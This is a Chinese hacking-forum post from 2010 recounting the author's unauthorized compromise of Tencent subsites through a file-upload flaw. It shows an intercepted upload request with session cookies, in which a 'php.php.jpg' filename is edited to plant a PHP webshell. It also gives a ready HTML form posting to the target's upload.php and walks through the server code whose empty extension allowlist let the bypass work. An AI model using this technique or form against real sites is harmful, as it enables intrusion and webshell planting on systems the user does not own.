@@ -1,0 +1,161 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+说说腾讯分站被黑的过程
+D8888D主贴内容-------------------------------------------------------
+[url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]01by:xhm1n9 
+
+02 2010.3.29 
+
+03   
+
+04      最近腾讯分站被“黑”的消息有蛮人多关注的，某带头大哥就叫我写了篇贴子说说相关的过程是怎样的,进入正题! 
+
+05                    
+
+06      大家都想像得到要黑腾讯这类大站找个明显的漏洞(包括注入)是很难的了，就算注入出密码肯定也加密了，解开了都不一定能找到后台拿shell，必境人家也是有相关的安全部门维护着！上传？除了后台哪里还有？我通过google搜,到处转了转看到腾讯某分站搞了个类似在线做动画的服务，当然前提是要登陆了才行，其中有个功能就是上传你的作品!这个地方能用？不限制上传类型？不试怎么知道！直接上php后缀的马不行，它是用js来控制的，只有jpg,bmp,gif后缀才能显视且才会开始上传。还有什么办法没？那就试试抓包再改后缀喽！内容如下： 
+
+07        
+
+08POST /games/412/upload.php HTTP/1.1 
+
+09Accept: text/* 
+
+10Content-Type: multipart/form-data; boundary=----------Ij5Ij5gL6ae0Ef1cH2ei4ae0GI3GI3 
+
+11User-Agent: Shockwave Flash 
+
+12Host: xxx.qq.com 
+
+13Content-Length: 69591       //注意修改后的字数 
+
+14Connection: Keep-Alive 
+
+15Cache-Control: no-cache 
+
+16Cookie: pgv_info=ssid=s1553263453&SPATHTAG=vip.qq.com/|NONE_REF; actwebinfo=1; qqactwebinfo=1; verifysession=7348bade52bad59bd71f3e368fb90efe261cd975f2632c49f622f5e7c95deb1fb0135e2f626632e0; uin=o0032182106; skey=@FXSiKBprF; qv_swfrfh=**********省略n多无关内容！ 
+
+17  
+
+18------------Ij5Ij5gL6ae0Ef1cH2ei4ae0GI3GI3 
+
+19Content-Disposition: form-data; name="Filedata"; filename="php.php.jpg" //我们去掉.jpg试试 
+
+20Content-Type: application/octet-stream 
+
+21.............................................//省略无关内容 
+
+22  
+
+23结果成功得到php后缀的shell地址，今天人品真不错，这样的漏洞都让我遇到，但是我有注意到域名和上传的页面并不一样，是yyy.qq.com的,进去后发现原来它跟目录下也有个上传文件upload.php,就拖了些相关文件和目录下来分析分析并写了个本地上传方便一些： 
+
+24  
+
+25<form name="upload_form" action="[url=http://yyy.qq.com/upload.php]链接标记http://yyy.qq.com/upload.php[/url]" method="post" enctype="multipart/form-data"> 
+
+26<input type="hidden" name="upfrom" value="flash" /> 
+
+27请选择文件: 
+
+28<input name="Filedata" type="file" /> 
+
+29<input type="submit" value="go" /> 
+
+30</form> 
+
+31  
+
+32下面我们来看看yyy.qq.com/upload.php这个文件 
+
+33  
+
+34............//省略无关代码 
+
+35$file_id = md5($_FILES["Filedata"]["tmp_name"] + rand()*100000); 
+
+36  
+
+37$file_ext = get_file_ext($_FILES["Filedata"]["name"],$allow_ext);     //注意 
+
+38  
+
+39$filename = $upload_dir.'/'.$fileFolder.'/'.$file_id.'.'.$file_ext; 
+
+40...........// 
+
+41elseif($upfrom == 'flash'){ 
+
+42        if(!$file_ext){ 
+
+43                header("HTTP/1.1 500 Internal Server Error"); 
+
+44                echo "bbb"; 
+
+45                exit(0); 
+
+46        } 
+
+47  
+
+48        if (!isset($_FILES["Filedata"]) || !is_uploaded_file($_FILES["Filedata"]["tmp_name"]) || $_FILES["Filedata"]["error"] != 0) { 
+
+49                header("HTTP/1.1 500 Internal Server Error"); 
+
+50                echo "qqq"; 
+
+51                exit(0); 
+
+52        } 
+
+53  
+
+54        if(!move_uploaded_file($_FILES["Filedata"]["tmp_name"],$filename)){ 
+
+55                header("HTTP/1.1 500 Internal Server Error"); 
+
+56                echo "ccc"; 
+
+57                exit(0); 
+
+58        } 
+
+59............//上面代码用了get_file_ext()我接再跟下去看看; 
+
+60  
+
+61function get_file_ext($filename,$exts = ''){ 
+
+62        if(!$file_ext = strrchr($filename,'.')){ 
+
+63                return false; 
+
+64        } 
+
+65        $file_ext = substr(strtolower($file_ext),1); 
+
+66        if($exts){ 
+
+67                $arr = explode('|',$exts); 
+
+68                if(!in_array($file_ext,$arr)){ 
+
+69                        return false; 
+
+70                } 
+
+71        } 
+
+72        return $file_ext; 
+
+73} 
+
+74可以看到此函数有叛断后缀是否为$exts里所允许的，但我发现代码里并没有定义$exts变量，也就是为空，所以跳过检查了，直接返回上传时的文件后缀! 
+
+75  
+
+76   后来皇子牛跟我说他发现xxx.qq.com提供的服务里还能上传头像也能通过上面的方法拿shell，地址就是xxx.qq.com/xxx.php,真没想到一时之间还两个分站有问题，我觉得到这里基本可以确定两分站的漏洞原因都是如上所说. 
+
+77   事后发现上传shell后没过多久就不见了，就怀凝是不是被发现了，跟皇子牛交流下后认为负载的可能性大些. 
+
+78   费话了这么久主要原因还是我们的运气好，不然分站也不是这么容易就可拿shell的:)
+
